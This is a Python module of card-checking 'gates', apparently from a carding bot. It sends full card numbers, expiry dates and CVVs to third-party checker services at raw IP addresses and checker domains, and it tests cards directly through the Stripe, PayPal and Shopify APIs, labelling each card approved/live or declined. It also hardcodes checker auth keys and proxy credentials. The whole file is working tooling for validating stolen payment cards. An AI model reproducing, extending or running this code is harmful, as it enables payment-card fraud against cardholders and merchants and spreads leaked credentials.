import subprocess
import json
import os
import sys
import re
import requests
import time as time_module

try:
    from .gates_python import check_card_real_gate
    PYTHON_GATES_AVAILABLE = True
except (ImportError, ModuleNotFoundError):
    PYTHON_GATES_AVAILABLE = False
    check_card_real_gate = None  # Type: ignore

def check_stripe_charge_gate(cc, mm, yy, cvv):
    """Check card using Stripe Charge €1 API"""
    start_time = time_module.time()
    
    try:
        # Format card data
        lista = f"{cc}|{mm}|{yy}|{cvv}"
        url = f"http://15.204.130.9:6969/check?cc={lista}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        
        response = requests.get(url, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        
        if response.status_code == 200:
            try:
                data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {"response": response.text}
            except:
                data = {"response": response.text}
            
            response_text = str(data).lower()
            
            if not response_text or len(response_text) < 5:
                return {
                    "status": "error",
                    "message": "Invalid API response",
                    "time": round(elapsed, 2)
                }
            
            decline_keywords = ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied']
            if any(kw in response_text for kw in decline_keywords):
                return {
                    "status": "success",
                    "message": data.get("message", data.get("response", "Card Declined")),
                    "time": round(elapsed, 2)
                }
            
            success_keywords = ['success', 'approved', 'captured', 'authorized', 'valid', 'passed', 'ok', 'true']
            if any(kw in response_text for kw in success_keywords):
                return {
                    "status": "success",
                    "message": data.get("message", data.get("response", "Card Approved")),
                    "time": round(elapsed, 2)
                }
            
            actual_msg = data.get("message", data.get("response", response_text[:100]))
            return {
                "status": "success",
                "message": actual_msg,
                "time": round(elapsed, 2)
            }
        else:
            return {
                "status": "error",
                "message": f"API Error: {response.status_code}",
                "time": round(elapsed, 2)
            }
            
    except requests.Timeout:
        return {
            "status": "error",
            "message": "Request timeout",
            "time": 30
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Error: {str(e)[:50]}",
            "time": 0
        }

def check_stripe_mass_auth_gate(cc, mm, yy, cvv):
    """Check card using Stripe Mass Auth API"""
    start_time = time_module.time()
    
    try:
        # Convert YY to YYYY if needed
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        # Build the lista parameter
        lista = f"{cc}|{mm}|{year}|{cvv}"
        
        # Get API key from environment
        api_key = os.environ.get("STRIPE_MASS_AUTH_API_KEY", "")
        if not api_key:
            return {
                "status": "error",
                "message": "API key not configured",
                "time": 0
            }
        
        # Make API request to the Stripe Mass Auth endpoint
        url = f"https://freechk.cards/free/stripe.php?lista={lista}"
        
        headers = {
            "Authorization": f"Bearer {api_key}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        
        response = requests.get(url, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        
        if response.status_code == 200:
            try:
                # Try to parse JSON response
                data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {"response": response.text}
            except:
                data = {"response": response.text}
            
            response_text = str(data).lower()
            
            # Strict validation
            if not response_text or len(response_text) < 5:
                return {
                    "status": "error",
                    "message": "Invalid API response",
                    "time": round(elapsed, 2)
                }
            
            # Check for decline/error
            decline_keywords = ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied']
            if any(kw in response_text for kw in decline_keywords):
                return {
                    "status": "success",
                    "message": data.get("message", data.get("response", "Card Declined")),
                    "time": round(elapsed, 2)
                }
            
            # Check for approval/success
            success_keywords = ['success', 'approved', 'captured', 'authorized', 'valid', 'passed', 'ok', 'true']
            if any(kw in response_text for kw in success_keywords):
                return {
                    "status": "success",
                    "message": data.get("message", data.get("response", "Card Approved")),
                    "time": round(elapsed, 2)
                }
            
            # Default: Return actual API response
            actual_msg = data.get("message", data.get("response", response_text[:100]))
            return {
                "status": "success",
                "message": actual_msg,
                "time": round(elapsed, 2)
            }
        else:
            return {
                "status": "error",
                "message": f"API Error: {response.status_code}",
                "time": round(elapsed, 2)
            }
            
    except requests.Timeout:
        return {
            "status": "error",
            "message": "Request timeout",
            "time": 30
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Error: {str(e)[:50]}",
            "time": 0
        }

# Netherex Stripe Auth API Configuration
NETHEREX_API_URL = "https://checker.netherex.xyz/strauth.php"
NETHEREX_AUTH_KEY = "netherex_auth_shorien_wpxp60bhe"

def _get_netherex_proxy():
    """Load the Stripe Auth proxy from bot settings file"""
    try:
        from config import DB_SETTINGS
        with open(DB_SETTINGS, 'r') as f:
            for line in f:
                if line.startswith('netherex_proxy='):
                    val = line.split('=', 1)[1].strip()
                    if val and val.lower() not in ('', 'none', 'disabled'):
                        return val
    except:
        pass
    return None

def check_stripe_newrp_gate(cc, mm, yy, cvv):
    """Check card using Netherex Stripe Auth API"""
    start_time = time_module.time()

    try:
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy

        card_str = f"{cc}|{mm}|{year}|{cvv}"
        params = {
            "card": card_str,
            "auth": NETHEREX_AUTH_KEY,
        }

        proxy = _get_netherex_proxy()
        if proxy:
            params["proxy"] = proxy

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        response = requests.get(NETHEREX_API_URL, params=params, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time

        if response.status_code == 200:
            response_text = response.text.strip()
            clean_response = response_text
            is_approved = False
            is_declined = False

            try:
                data = response.json()
                if isinstance(data, dict):
                    status_val = str(data.get('status', data.get('Status', ''))).lower()
                    msg = data.get('message', data.get('Message', data.get('response', data.get('msg', ''))))

                    if msg:
                        clean_response = str(msg).replace('_', ' ')
                        if clean_response.islower():
                            clean_response = clean_response.title()

                    if any(k in status_val for k in ['approved', 'success', 'charged', 'live', 'valid']):
                        is_approved = True
                    elif any(k in status_val for k in ['declined', 'failed', 'error', 'dead', 'invalid']):
                        is_declined = True

                    if not is_approved and not is_declined and msg:
                        msg_lower = str(msg).lower()
                        if any(k in msg_lower for k in ['approved', 'charged', 'captured', 'authorized', 'valid', 'card valid', 'authenticated']):
                            is_approved = True
                        elif any(k in msg_lower for k in ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied', 'insufficient']):
                            is_declined = True
            except:
                clean_response = response_text.replace('_', ' ')
                response_lower = clean_response.lower()
                if any(k in response_lower for k in ['approved', 'charged', 'authorized', 'valid', 'live']):
                    is_approved = True
                elif any(k in response_lower for k in ['declined', 'failed', 'error', 'invalid', 'dead']):
                    is_declined = True

            if is_approved:
                return {"status": "success", "message": f"Approved - {clean_response}", "time": round(elapsed, 2)}
            elif is_declined:
                return {"status": "success", "message": f"Declined - {clean_response}", "time": round(elapsed, 2)}
            else:
                return {"status": "success", "message": f"Response - {clean_response}", "time": round(elapsed, 2)}
        else:
            return {"status": "error", "message": f"API Error: {response.status_code}", "time": round(time_module.time() - start_time, 2)}

    except requests.Timeout:
        return {"status": "error", "message": "Request timeout", "time": 30}
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)[:50]}", "time": 0}

NETHEREX_SHOPIFY_URL = "https://checker.netherex.xyz/autosh.php"
NETHEREX_SHOPIFY_AUTH = "netherex_auth_autosh"

def _get_shopify_proxy():
    """Load the Shopify proxy from bot settings file"""
    try:
        from config import DB_SETTINGS
        with open(DB_SETTINGS, 'r') as f:
            for line in f:
                if line.startswith('shopify_proxy='):
                    val = line.split('=', 1)[1].strip()
                    if val and val.lower() not in ('', 'none', 'disabled'):
                        return val
    except:
        pass
    return None

def check_shopify_netherex_gate(cc, mm, yy, cvv):
    """Check card using Netherex Shopify API"""
    start_time = time_module.time()

    try:
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy

        card_str = f"{cc}|{mm}|{year}|{cvv}"
        params = {
            "card": card_str,
            "auth": NETHEREX_SHOPIFY_AUTH,
        }

        proxy = _get_shopify_proxy()
        if proxy:
            params["proxy"] = proxy

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        response = requests.get(NETHEREX_SHOPIFY_URL, params=params, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time

        if response.status_code == 200:
            response_text = response.text.strip()
            clean_response = response_text
            is_approved = False
            is_declined = False

            try:
                data = response.json()
                if isinstance(data, dict):
                    status_val = str(data.get('status', data.get('Status', ''))).lower()
                    msg = data.get('message', data.get('Message', data.get('response', data.get('msg', ''))))

                    if msg:
                        clean_response = str(msg).replace('_', ' ')
                        if clean_response.islower():
                            clean_response = clean_response.title()

                    if any(k in status_val for k in ['approved', 'success', 'charged', 'live', 'valid']):
                        is_approved = True
                    elif any(k in status_val for k in ['declined', 'failed', 'error', 'dead', 'invalid']):
                        is_declined = True

                    if not is_approved and not is_declined and msg:
                        msg_lower = str(msg).lower()
                        if any(k in msg_lower for k in ['approved', 'charged', 'captured', 'authorized', 'valid', 'card valid', 'authenticated']):
                            is_approved = True
                        elif any(k in msg_lower for k in ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied', 'insufficient']):
                            is_declined = True
            except:
                clean_response = response_text.replace('_', ' ')
                response_lower = clean_response.lower()
                if any(k in response_lower for k in ['approved', 'charged', 'authorized', 'valid', 'live']):
                    is_approved = True
                elif any(k in response_lower for k in ['declined', 'failed', 'error', 'invalid', 'dead']):
                    is_declined = True

            if is_approved:
                return {"status": "success", "message": f"Approved - {clean_response}", "time": round(elapsed, 2)}
            elif is_declined:
                return {"status": "success", "message": f"Declined - {clean_response}", "time": round(elapsed, 2)}
            else:
                return {"status": "success", "message": f"Response - {clean_response}", "time": round(elapsed, 2)}
        else:
            return {"status": "error", "message": f"API Error: {response.status_code}", "time": round(time_module.time() - start_time, 2)}

    except requests.Timeout:
        return {"status": "error", "message": "Request timeout", "time": 30}
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)[:50]}", "time": 0}

# Razorpay API Configuration (barryxapi.xyz)
RAZORPAY_API_URL = "https://api.barryxapi.xyz/razorpay"
RAZORPAY_API_KEY = os.environ.get("RAZORPAY_API_KEY", "BRY-KESNP-TUPWH-JFOT9")

def check_razorpay_gate(cc, mm, yy, cvv):
    """Check card using Razorpay API via barryxapi.xyz"""
    start_time = time_module.time()
    
    try:
        # Convert YY to YYYY if needed
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        # Build the card parameter
        card = f"{cc}|{mm}|{year}|{cvv}"
        
        # Make API request with POST
        payload = {
            "key": RAZORPAY_API_KEY,
            "card": card,
            "amount": None,
            "site": "site",
            "proxy": None
        }
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        
        response = requests.post(RAZORPAY_API_URL, json=payload, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        
        if response.status_code == 200:
            response_text = response.text.strip()
            response_lower = response_text.lower()
            
            # Parse JSON response to extract clean message
            clean_response = response_text
            try:
                data = response.json()
                if isinstance(data, dict):
                    # Handle various response structures
                    inner = None
                    if 'data' in data and isinstance(data['data'], dict):
                        inner = data['data']
                    elif 'Data' in data and isinstance(data['Data'], dict):
                        inner = data['Data']
                    
                    if inner:
                        if 'Error' in inner and isinstance(inner['Error'], dict):
                            reason = inner['Error'].get('Message', inner['Error'].get('message', ''))
                        elif 'error' in inner and isinstance(inner['error'], dict):
                            reason = inner['error'].get('message', inner['error'].get('Message', ''))
                        else:
                            reason = inner.get('response', inner.get('message', ''))
                        if reason:
                            clean_response = str(reason).replace('_', ' ')
                            if clean_response.islower():
                                clean_response = clean_response.title()
                    else:
                        # Try direct fields
                        for field in ['response', 'message', 'Message', 'error', 'Error', 'result', 'status']:
                            if field in data and isinstance(data[field], str):
                                clean_response = data[field].replace('_', ' ').title()
                                break
                            elif field in data and isinstance(data[field], dict):
                                msg = data[field].get('message', data[field].get('Message', ''))
                                if msg:
                                    clean_response = msg.replace('_', ' ').title()
                                    break
            except:
                pass
            
            # Last resort: use regex to extract Message from JSON
            if '{' in clean_response and 'Message' in clean_response:
                match = re.search(r'"Message"\s*:\s*"([^"]+)"', clean_response)
                if match:
                    clean_response = match.group(1)
            
            # Check for approval keywords
            success_keywords = ['payment successful', 'success', 'approved', 'charged', 'captured', 'valid']
            if any(kw in response_lower for kw in success_keywords):
                return {
                    "status": "success",
                    "message": f"Approved - {clean_response}",
                    "time": round(elapsed, 2)
                }
            else:
                # Decline with clean response
                return {
                    "status": "success",
                    "message": f"Declined - {clean_response}",
                    "time": round(elapsed, 2)
                }
        else:
            return {
                "status": "error",
                "message": f"API Error: {response.status_code}",
                "time": round(elapsed, 2)
            }
            
    except requests.Timeout:
        return {
            "status": "error",
            "message": "Request timeout",
            "time": 30
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Error: {str(e)[:50]}",
            "time": 0
        }

def check_braintree_gate(cc, mm, yy, cvv):
    """Check card using Braintree API"""
    start_time = time_module.time()
    
    try:
        # Convert YY to full date format
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        lista = f"{cc}|{mm}|{year}|{cvv}"
        url = f"http://194.150.166.130:5000/?cc={lista}"
        
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        
        response = requests.get(url, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        
        if response.status_code == 200:
            response_text = response.text.strip()
            clean_response = response_text
            is_approved = False
            is_declined = False
            
            try:
                data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {"response": response.text}
                response_lower = str(data).lower()
            except:
                data = {"response": response_text}
                response_lower = response_text.lower()
            
            # Check for approval keywords
            if any(kw in response_lower for kw in ['approved', 'success', 'valid', 'charged', 'accepted']):
                is_approved = True
                clean_response = data.get("message", data.get("response", "Card Approved"))
            elif any(kw in response_lower for kw in ['declined', 'failed', 'error', 'invalid', 'rejected']):
                is_declined = True
                clean_response = data.get("message", data.get("response", "Card Declined"))
            else:
                clean_response = data.get("message", data.get("response", response_text))
            
            if is_approved:
                return {
                    "status": "success",
                    "message": f"Approved - {clean_response}" if "approved" not in str(clean_response).lower() else str(clean_response),
                    "time": round(elapsed, 2)
                }
            else:
                return {
                    "status": "success",
                    "message": str(clean_response),
                    "time": round(elapsed, 2)
                }
        else:
            return {
                "status": "error",
                "message": f"API Error: {response.status_code}",
                "time": round(elapsed, 2)
            }
    except requests.Timeout:
        return {"status": "error", "message": "Request timeout", "time": 30}
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)[:50]}", "time": 0}

def check_stripe_auth_gate(cc, mm, yy, cvv):
    """Check card using Stripe Auth API"""
    start_time = time_module.time()
    
    try:
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        lista = f"{cc}|{mm}|{year}|{cvv}"
        lista_short = f"{cc}|{mm}|{yy}|{cvv}"
        
        urls = [
            f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe_auth",
            f"https://freechk.cards/free/stripe.php?lista={lista}",
            f"https://api.nyvexis.com/stripeauth/?lista={lista_short}",
        ]
        
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        
        for url in urls:
            try:
                response = requests.get(url, headers=headers, timeout=15)
                elapsed = time_module.time() - start_time
                
                if response.status_code == 200:
                    try:
                        data = response.json() if 'application/json' in response.headers.get('content-type', '') else {"response": response.text}
                    except:
                        data = {"response": response.text}
                    
                    response_text = str(data).lower()
                    if not response_text or len(response_text) < 5:
                        continue
                    
                    decline_keywords = ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied']
                    if any(kw in response_text for kw in decline_keywords):
                        return {"status": "success", "message": data.get("message", data.get("response", "Card Declined")), "time": round(elapsed, 2)}
                    
                    success_keywords = ['success', 'approved', 'captured', 'authorized', 'valid', 'passed']
                    if any(kw in response_text for kw in success_keywords):
                        return {"status": "success", "message": data.get("message", data.get("response", "Card Approved")), "time": round(elapsed, 2)}
                    
                    return {"status": "success", "message": data.get("message", data.get("response", response_text[:100])), "time": round(elapsed, 2)}
            except:
                continue
        
        elapsed = time_module.time() - start_time
        return {"status": "error", "message": "Stripe Auth API unavailable - try again", "time": round(elapsed, 2)}
    except Exception as e:
        return {"status": "error", "message": f"Stripe Auth Error: {str(e)[:50]}", "time": 0}

def check_stripe_amount_gate(cc, mm, yy, cvv, gate_name):
    """Check card using Stripe Amount gates (st5, st12, str, dep, sor)"""
    start_time = time_module.time()
    
    try:
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        lista = f"{cc}|{mm}|{year}|{cvv}"
        
        amount_map = {
            'sor': 2,
            'st5': 5,
            'st12': 12,
            'str': 15,
            'dep': 49
        }
        amount = amount_map.get(gate_name, 5)
        
        gate_display = {
            'sor': 'Stripe $2',
            'st5': 'Stripe $5',
            'st12': 'Stripe $12',
            'str': 'Stripe $15',
            'dep': 'Stripe $49'
        }.get(gate_name, f'Stripe ${amount}')
        
        urls = [
            f"https://freechk.cards/free/stripe.php?lista={lista}&amount={amount}",
            f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe{amount}",
        ]
        
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        
        for url in urls:
            try:
                response = requests.get(url, headers=headers, timeout=20)
                elapsed = time_module.time() - start_time
                
                if response.status_code == 200:
                    response_text = response.text.strip()
                    response_lower = response_text.lower()
                    
                    if not response_text or len(response_text) < 3:
                        continue
                    
                    credit_issues = ['no have credits', 'no credits', 'out of credits', 'add more credits']
                    if any(issue in response_lower for issue in credit_issues):
                        continue
                    
                    try:
                        data = response.json()
                        msg = data.get('message', data.get('response', response_text))
                    except:
                        msg = response_text
                    
                    success_keywords = ['approved', 'success', 'charged', 'captured', 'valid']
                    decline_keywords = ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected']
                    
                    if any(kw in response_lower for kw in success_keywords):
                        return {"status": "success", "message": f"Approved - {msg}", "time": round(elapsed, 2)}
                    elif any(kw in response_lower for kw in decline_keywords):
                        return {"status": "success", "message": f"Declined - {msg}", "time": round(elapsed, 2)}
                    else:
                        return {"status": "success", "message": msg, "time": round(elapsed, 2)}
            except requests.Timeout:
                continue
            except:
                continue
        
        elapsed = time_module.time() - start_time
        return {"status": "error", "message": f"{gate_display} API timeout - try again", "time": round(elapsed, 2)}
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)[:50]}", "time": 0}

def check_shopify_auto_gate(cc, mm, yy, cvv):
    """Check card using Shopify Payment Session API"""
    start_time = time_module.time()
    
    try:
        # Convert year if needed
        year = yy if len(yy) == 4 else f"20{yy}"
        
        # Shopify Payment API endpoint
        session = requests.Session()
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        
        # Shopify Payment Session API
        payment_session_data = {
            'credit_card': {
                'number': cc,
                'month': int(mm),
                'year': int(year),
                'verification_value': cvv,
                'name': 'Test User',
            },
            'payment_session_scope': 'example.myshopify.com',
        }
        
        response = session.post(
            'https://checkout.pci.shopifyinc.com/sessions',
            json=payment_session_data,
            headers=headers,
            timeout=15
        )
        
        elapsed = time_module.time() - start_time
        
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get('id'):
                    return {"status": "success", "message": "Approved - Card Valid", "time": round(elapsed, 2)}
                elif 'error' in data:
                    return {"status": "success", "message": f"Declined - {data['error'].get('message', 'Card Declined')}", "time": round(elapsed, 2)}
            except:
                pass
        
        if response.status_code == 400 or response.status_code == 422:
            try:
                error_data = response.json()
                if 'error' in error_data:
                    error_msg = error_data['error'].get('message', 'Card Declined')
                    return {"status": "success", "message": f"Declined - {error_msg}", "time": round(elapsed, 2)}
            except:
                pass
            return {"status": "success", "message": "Declined - Invalid Card", "time": round(elapsed, 2)}
        
        # For other status codes, treat as unavailable
        return {"status": "error", "message": f"Shopify API Error: {response.status_code}", "time": round(elapsed, 2)}
            
    except requests.Timeout:
        elapsed = time_module.time() - start_time
        return {"status": "error", "message": "Shopify API timeout", "time": round(elapsed, 2)}
    except Exception as e:
        elapsed = time_module.time() - start_time
        return {"status": "error", "message": f"Shopify Error: {str(e)[:50]}", "time": round(elapsed, 2)}


# ============================================================
# CYBOR GATES — Stripe Auth V1/V2/V3, Shopii #1-4, SK-Based,
#               PP KeyBased, PP #2, B3 #1/#2
# ============================================================

CYBOR_STV_URLS = {
    'stv1': 'http://206.206.78.217:1011/',
    'stv2': 'http://206.206.78.217:1012/',
    'stv3': 'http://206.206.78.217:1013/',
}
CYBOR_SHOPII_URL = 'https://cyborxchecker.com/api/autog.php'

def _parse_cybor_response(text, data, elapsed):
    """Parse response from Cybor-style API endpoints (shared logic)."""
    clean = text.strip()
    is_approved = False
    is_declined = False

    if isinstance(data, dict):
        status_val = str(data.get('status', data.get('Status', ''))).lower()
        msg = data.get('message', data.get('Message', data.get('response',
              data.get('msg', data.get('result', '')))))
        if msg:
            clean = str(msg).replace('_', ' ')
            if clean.islower():
                clean = clean.title()
        if any(k in status_val for k in ['approved', 'success', 'charged', 'live', 'valid', 'ccn', 'cvv']):
            is_approved = True
        elif any(k in status_val for k in ['declined', 'failed', 'error', 'dead', 'invalid']):
            is_declined = True

    if not is_approved and not is_declined:
        low = clean.lower()
        if any(k in low for k in ['approved', 'charged', 'captured', 'authorized', 'valid',
                                   'card valid', 'authenticated', 'ccn', 'cvv match']):
            is_approved = True
        elif any(k in low for k in ['declined', 'failed', 'error', 'invalid', 'expired',
                                    'rejected', 'denied', 'insufficient']):
            is_declined = True

    if is_approved:
        return {'status': 'success', 'message': f'Approved - {clean}', 'time': round(elapsed, 2)}
    elif is_declined:
        return {'status': 'success', 'message': f'Declined - {clean}', 'time': round(elapsed, 2)}
    else:
        return {'status': 'success', 'message': f'Response - {clean}', 'time': round(elapsed, 2)}


def check_stv_gate(version, cc, mm, yy, cvv):
    """Stripe Auth V1/V2/V3 via CyborX 206.206.78.217:1011-1013"""
    start_time = time_module.time()
    url = CYBOR_STV_URLS.get(version)
    if not url:
        return {'status': 'error', 'message': f'Unknown Stripe version: {version}', 'time': 0}
    try:
        year = f'20{yy}' if len(yy) == 2 else yy
        card_str = f'{cc}|{mm}|{year}|{cvv}'
        params = {'card': card_str}
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        resp = requests.get(url, params=params, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        if resp.status_code == 200:
            try:
                data = resp.json()
            except Exception:
                data = {}
            return _parse_cybor_response(resp.text, data, elapsed)
        return {'status': 'error', 'message': f'API Error: {resp.status_code}', 'time': round(elapsed, 2)}
    except requests.Timeout:
        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}


def check_shopii_gate(pack, cc, mm, yy, cvv):
    """Shopii #1-4 — tries cyborxchecker first, falls back to Netherex Shopify"""
    start_time = time_module.time()
    year = f'20{yy}' if len(yy) == 2 else yy
    card_str = f'{cc}|{mm}|{year}|{cvv}'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

    try:
        params = {'card': card_str, 'pack': pack}
        resp = requests.get(CYBOR_SHOPII_URL, params=params, headers=headers, timeout=15)
        elapsed = time_module.time() - start_time
        if resp.status_code == 200 and resp.text.strip():
            low = resp.text.lower()
            if not any(k in low for k in ['no have credits', 'no credits', 'out of credits',
                                           'buy credits', 'credit limit', 'api limit']):
                try:
                    data = resp.json()
                except Exception:
                    data = {}
                return _parse_cybor_response(resp.text, data, elapsed)
    except Exception:
        pass

    try:
        params2 = {'card': card_str, 'auth': NETHEREX_SHOPIFY_AUTH}
        proxy = _get_shopify_proxy()
        if proxy:
            params2['proxy'] = proxy
        resp2 = requests.get(NETHEREX_SHOPIFY_URL, params=params2, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        if resp2.status_code == 200:
            try:
                data2 = resp2.json()
            except Exception:
                data2 = {}
            return _parse_cybor_response(resp2.text, data2, elapsed)
    except Exception:
        pass

    elapsed = time_module.time() - start_time
    return {'status': 'error', 'message': 'Shopify gate temporarily unavailable', 'time': round(elapsed, 2)}


def check_skbased_gate(cc, mm, yy, cvv, sk_key=None):
    """SK-Based CVV check via Stripe API using a live/test Secret Key"""
    import urllib.parse
    start_time = time_module.time()
    if not sk_key:
        return {'status': 'error',
                'message': 'No Stripe SK key configured. Add your SK key in settings.',
                'time': 0}
    try:
        year = f'20{yy}' if len(yy) == 2 else yy
        payload = urllib.parse.urlencode({
            'type': 'card',
            'card[number]': cc,
            'card[exp_month]': mm,
            'card[exp_year]': year,
            'card[cvc]': cvv,
        })
        headers = {
            'Authorization': f'Bearer {sk_key}',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0',
        }
        resp = requests.post('https://api.stripe.com/v1/payment_methods',
                             data=payload, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        try:
            data = resp.json()
        except Exception:
            data = {}
        if resp.status_code == 200 and data.get('id'):
            pm_id = data.get('id', '')
            brand = data.get('card', {}).get('brand', '').title()
            return {'status': 'success',
                    'message': f'Approved - Card valid ({brand}) [{pm_id}]',
                    'time': round(elapsed, 2)}
        elif resp.status_code in (402, 200) or 'error' in data:
            err = data.get('error', {})
            code = err.get('code', '')
            msg = err.get('message', 'Declined')
            if code in ('card_declined', 'incorrect_number', 'expired_card',
                        'incorrect_cvc', 'processing_error'):
                return {'status': 'success',
                        'message': f'Declined - {msg}',
                        'time': round(elapsed, 2)}
            return {'status': 'success',
                    'message': f'Response - {msg}',
                    'time': round(elapsed, 2)}
        return {'status': 'error', 'message': f'API Error: {resp.status_code}', 'time': round(elapsed, 2)}
    except requests.Timeout:
        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}


def check_pp_keybased_gate(cc, mm, yy, cvv, client_id=None, client_secret=None):
    """PP KeyBased — create PayPal order to validate card"""
    import base64, urllib.parse
    start_time = time_module.time()
    if not client_id or not client_secret:
        return {'status': 'error',
                'message': 'No PayPal credentials configured. Add Client ID and Secret in form.',
                'time': 0}
    try:
        creds = base64.b64encode(f'{client_id}:{client_secret}'.encode()).decode()
        token_resp = requests.post(
            'https://api-m.paypal.com/v1/oauth2/token',
            headers={'Authorization': f'Basic {creds}', 'Content-Type': 'application/x-www-form-urlencoded'},
            data='grant_type=client_credentials', timeout=15)
        elapsed_token = time_module.time() - start_time
        if token_resp.status_code != 200:
            return {'status': 'error', 'message': 'Invalid PayPal credentials', 'time': round(elapsed_token, 2)}
        access_token = token_resp.json().get('access_token', '')
        year = f'20{yy}' if len(yy) == 2 else yy
        order_payload = {
            'intent': 'CAPTURE',
            'purchase_units': [{'amount': {'currency_code': 'USD', 'value': '1.00'}}],
            'payment_source': {
                'card': {
                    'number': cc,
                    'expiry': f'{year}-{mm}',
                    'security_code': cvv,
                }
            }
        }
        order_resp = requests.post(
            'https://api-m.paypal.com/v2/checkout/orders',
            headers={'Authorization': f'Bearer {access_token}',
                     'Content-Type': 'application/json'},
            json=order_payload, timeout=30)
        elapsed = time_module.time() - start_time
        try:
            data = order_resp.json()
        except Exception:
            data = {}
        if order_resp.status_code in (200, 201):
            status_val = data.get('status', '')
            return {'status': 'success', 'message': f'Approved - {status_val}', 'time': round(elapsed, 2)}
        err_details = data.get('details', [{}])
        msg = err_details[0].get('description', data.get('message', 'Declined')) if err_details else data.get('message', 'Declined')
        return {'status': 'success', 'message': f'Declined - {msg}', 'time': round(elapsed, 2)}
    except requests.Timeout:
        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}


def check_pp2_gate(cc, mm, yy, cvv):
    """PP #2 — PayPal AVS check via Netherex"""
    start_time = time_module.time()
    try:
        year = f'20{yy}' if len(yy) == 2 else yy
        card_str = f'{cc}|{mm}|{year}|{cvv}'
        params = {'card': card_str, 'auth': NETHEREX_AUTH_KEY}
        headers = {'User-Agent': 'Mozilla/5.0'}
        resp = requests.get('https://checker.netherex.xyz/paypalcheck.php',
                            params=params, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        if resp.status_code == 200:
            try:
                data = resp.json()
            except Exception:
                data = {}
            return _parse_cybor_response(resp.text, data, elapsed)
        return {'status': 'error', 'message': f'API Error: {resp.status_code}', 'time': round(elapsed, 2)}
    except requests.Timeout:
        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}


def check_b3_variant_gate(variant, cc, mm, yy, cvv):
    """B3 #1 / B3 #2 — Braintree variants via vkrm.site"""
    import asyncio
    start_time = time_module.time()
    try:
        from modules.b3_gate import check_b3
        proxy_map = {
            'b31': 'unew.quantumproxies.net:10000:Quantum-3f777gyjdWSRdz6IL:gfj2am3i',
            'b32': 'unew.quantumproxies.net:10000:Quantum-3f777gyjdWSRdz6IL:gfj2am3i',
        }
        result = asyncio.run(check_b3(cc, mm, yy, cvv))
        elapsed = time_module.time() - start_time
        status_val = result.get('status', 'ERROR').upper()
        msg = result.get('response', 'No response')
        if status_val in ('CHARGED', 'LIVE', 'CCN', 'CVV'):
            return {'status': 'success', 'message': f'Approved - {msg}', 'time': round(elapsed, 2)}
        elif status_val in ('DEAD', 'DECLINED', 'INVALID'):
            return {'status': 'success', 'message': f'Declined - {msg}', 'time': round(elapsed, 2)}
        return {'status': 'success', 'message': f'Response - {msg}', 'time': round(elapsed, 2)}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': round(time_module.time() - start_time, 2)}


